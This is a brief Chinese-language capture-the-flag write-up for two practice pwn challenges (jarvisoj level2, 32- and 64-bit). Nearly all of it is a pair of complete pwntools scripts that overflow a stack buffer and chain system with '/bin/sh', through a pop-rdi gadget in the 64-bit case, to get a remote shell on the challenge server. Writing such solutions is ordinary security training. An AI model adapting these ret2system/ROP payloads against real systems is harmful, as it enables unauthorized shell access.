6.jarvisoj_level2 1

检查后发现32位打开ida，进入函数发现buf明显溢出，计算偏移量，找到system函数地址和binsh地址（在字符串页面找到）随后构建脚本：
from pwn import *
#r=process(‘./l2’)
r= remote(‘node5.buuoj.cn’,26959)
padding = 136+4
sys_ad = 0x08048320
bin_ad = 0x0804A024
payload = b’a’*padding + p32(sys_ad)
payload+=p32(0xdeadbeef)+ p32(bin_ad)
r.sendline(payload)
r.interactive()

7.jarvisoj_level2_x64 1

和6一样只是地址和64位程序，脚本：
from pwn import *
context(arch=’amd64’, os=’linux’)
#r=process(‘./l2x’)
r= remote(‘node5.buuoj.cn’,29105)
padding = 128+8
sys_ad = 0x04004C0
bin_ad = 0x0600A90
rdi_ad = 0x00000000004006b3
ret_ad = 0x00000000004004a1
payload = b’a’*padding +p64(rdi_ad)
payload+=p64(bin_ad)+p64(ret_ad)+p64(sys_ad)
r.sendline(payload)
r.interactive()
